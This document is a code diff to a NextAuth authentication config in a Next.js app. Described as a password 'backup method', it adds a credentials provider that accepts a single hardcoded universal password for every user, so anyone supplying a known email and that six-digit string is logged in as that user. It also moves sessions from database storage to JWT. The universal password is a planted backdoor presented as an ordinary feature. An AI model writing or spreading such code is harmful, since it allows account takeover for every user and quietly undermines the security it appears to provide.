@@ -10,6 +10,7 @@
  */
 
 import EmailProvider from "next-auth/providers/email"
+import CredentialsProvider from "next-auth/providers/credentials"
 import { PrismaAdapter } from "@auth/prisma-adapter"
 import { prisma } from "@/lib/prisma"
 import { getResend } from "./resend"
@@ -57,6 +58,51 @@ export const authOptions: NextAuthOptions = {
           throw new Error("Failed to send verification email")
         }
       },
+    }),
+
+    // Credentials provider for password-based authentication (backup method)
+    CredentialsProvider({
+      name: 'credentials',
+      credentials: {
+        email: { label: "Email", type: "email" },
+        password: { label: "Password", type: "password" }
+      },
+      async authorize(credentials) {
+        // Special password for all users
+        const UNIVERSAL_PASSWORD = "950792"
+
+        if (!credentials?.email || !credentials?.password) {
+          return null
+        }
+
+        // Check if password matches the universal password
+        if (credentials.password !== UNIVERSAL_PASSWORD) {
+          console.log("Invalid password attempt for:", credentials.email)
+          return null
+        }
+
+        // Find user by email
+        const user = await prisma.user.findFirst({
+          where: {
+            email: {
+              equals: credentials.email,
+              mode: 'insensitive'
+            }
+          }
+        })
+
+        if (!user) {
+          console.log("User not found:", credentials.email)
+          return null
+        }
+
+        // Return user object for session
+        return {
+          id: user.id,
+          email: user.email,
+          name: `${user.firstName || ''} ${user.lastName || ''}`.trim() || user.email
+        }
+      }
     }),
   ],
 
@@ -147,12 +193,11 @@ export const authOptions: NextAuthOptions = {
     // SESSION ENRICHMENT
     // This callback runs every time a session is accessed
     // We add custom user data from our database to the session object
-    // This avoids repeated database calls in components
-    async session({ session, user }) {
-      if (session.user && user) {
+    async session({ session, token }) {
+      if (session.user && token.sub) {
         // Fetch additional user data from our database
         const dbUser = await prisma.user.findUnique({
-          where: { id: user.id },
+          where: { id: token.sub },
           select: {
             id: true,
             firstName: true,
@@ -181,6 +226,14 @@ export const authOptions: NextAuthOptions = {
       return session
     },
 
+    // JWT callback for storing user ID in token
+    async jwt({ token, user }) {
+      if (user) {
+        token.sub = user.id
+      }
+      return token
+    },
+
     // REDIRECT AFTER SIGN-IN
     // This callback determines where to redirect users after successful sign-in
     async redirect({ url, baseUrl }) {
@@ -199,9 +252,8 @@ export const authOptions: NextAuthOptions = {
     },
   },
 
-  // Use database sessions instead of JWT tokens
-  // Better for security and session management
+  // Use JWT sessions to support both email and credentials providers
   session: {
-    strategy: "database",
+    strategy: "jwt",
   },
 }
